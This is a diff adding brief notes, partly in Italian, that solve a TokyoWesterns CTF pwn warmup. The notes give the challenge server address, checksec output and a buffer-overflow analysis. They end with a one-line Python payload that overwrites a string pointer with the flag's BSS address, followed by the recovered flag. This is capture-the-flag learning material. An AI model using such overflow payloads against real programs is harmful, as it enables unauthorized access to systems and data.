@@ -1,0 +1,19 @@
+nc pwn1.chal.ctf.westerns.tokyo 12345
+(Alternative port: nc pwn1.chal.ctf.westerns.tokyo 12482)
+
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+
+32 bit
+l'input (max 32 byte) viene messo in un buffer di 1 char.
+possiamo overfloware e sovrascrivere il puntatore di una stringa che viene stampata.
+la flag viene salvata nel BSS all'indirizzo 0804A080
+sovrascriviamo il puntatore con 0804A080 e dovrebbe stamparci la flag
+
+python -c "print 'A'*20 + '\x80\xA0\x04\x08'"
+
+TWCTF{pwnable_warmup_I_did_it!}
+
